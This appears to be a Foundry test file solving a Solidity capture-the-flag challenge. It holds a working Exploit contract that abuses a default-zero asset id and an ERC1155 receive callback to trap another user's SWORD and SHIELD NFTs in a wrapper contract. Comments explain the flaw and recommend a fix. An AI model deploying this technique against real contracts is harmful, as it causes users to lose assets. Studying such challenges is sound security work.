// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// utilities
import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
// core contracts
import {GameAsset} from "src/game-assets/GameAsset.sol";
import {AssetWrapper} from "src/game-assets/AssetWrapper.sol";
import {IERC1155Receiver} from "@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol";

contract Testing is Test {
    address attacker = makeAddr("attacker");
    address o1 = makeAddr("o1");
    address o2 = makeAddr("o2");
    address admin = makeAddr("admin"); // should not be used
    address adminUser = makeAddr("adminUser"); // should not be used

    AssetWrapper assetWrapper;
    GameAsset swordAsset;
    GameAsset shieldAsset;

    /// preliminary state
    function setUp() public {
        // funding accounts
        vm.deal(admin, 10_000 ether);
        vm.deal(attacker, 10_000 ether);
        vm.deal(adminUser, 10_000 ether);

        // deploying core contracts
        vm.prank(admin);
        assetWrapper = new AssetWrapper("");

        vm.prank(admin);
        swordAsset = new GameAsset("SWORD", "SWORD");
        vm.prank(admin);
        shieldAsset = new GameAsset("SHIELD", "SHIELD");

        // whitelist the two assets for use in the game
        vm.prank(admin);
        assetWrapper.updateWhitelist(address(swordAsset));
        vm.prank(admin);
        assetWrapper.updateWhitelist(address(shieldAsset));

        // set operator of the two game assets to be the wrapper contract
        vm.prank(admin);
        swordAsset.setOperator(address(assetWrapper));
        vm.prank(admin);
        shieldAsset.setOperator(address(assetWrapper));

        // adminUser is the user you will be griefing
        // minting 1 SWORD & 1 SHIELD asset for adminUser
        vm.prank(admin);
        swordAsset.mintForUser(adminUser, 1);
        vm.prank(admin);
        shieldAsset.mintForUser(adminUser, 1);
    }

    /// solves the challenge
    function testChallengeExploit() public {
        console.log("attacker is:", attacker);
        console.log("admin is:", admin);
        console.log("adminUser is:", adminUser);
        vm.startPrank(attacker, attacker);

        Exploit attack = new Exploit(assetWrapper);
        attack.attack(swordAsset);
        attack.attack(shieldAsset);

        vm.stopPrank();
        validation();
    }

    /// expected final state
    function validation() public {
        // attacker traps user's SWORD and SHIELD NFTs inside assetWrapper contract
        assertEq(swordAsset.balanceOf(adminUser), 0);
        assertEq(shieldAsset.balanceOf(adminUser), 0);

        assertEq(swordAsset.balanceOf(address(assetWrapper)), 1);
        assertEq(shieldAsset.balanceOf(address(assetWrapper)), 1);

        assertEq(assetWrapper.balanceOf(adminUser, 0), 0);
        assertEq(assetWrapper.balanceOf(adminUser, 1), 0);
    }
}

contract Exploit is IERC1155Receiver {
    AssetWrapper target;
    GameAsset gameAsset;

    constructor(AssetWrapper _target) {
        target = _target;
    }

    function attack(GameAsset _gameAsset) public {
        gameAsset = _gameAsset;
        target.wrap(0, address(this), address(_gameAsset));
    }

    function onERC1155Received(address, address, uint256, uint256, bytes calldata data) external returns (bytes4) {
        target.unwrap(address(this), address(gameAsset));
        return IERC1155Receiver.onERC1155Received.selector;
    }

    function onERC1155BatchReceived(
        address,
        address,
        uint256[] calldata ids,
        uint256[] calldata values,
        bytes calldata data
    ) external returns (bytes4) {
        return bytes4(0);
    }

    function supportsInterface(bytes4 interfaceId) external view returns (bool) {
        return true;
    }
}

// the vulnerability in this contracts was usage of Counter library, specifically the fact, that it starts counting from default 0
// counters are used in both GameAsset and AssetWrapper
// the issue is that non-existent asset Id in :
//         uint256 assetId = _assetId[assetAddress];
// will return 0, which at the same time is real NFT id for GameAsset
// as a result it is possible to wrap NFT with 0 id and on callback in _mint function, unwrap it , claiming ownership of that NFT

// Recommendation: start counter( _tokenId) from 1
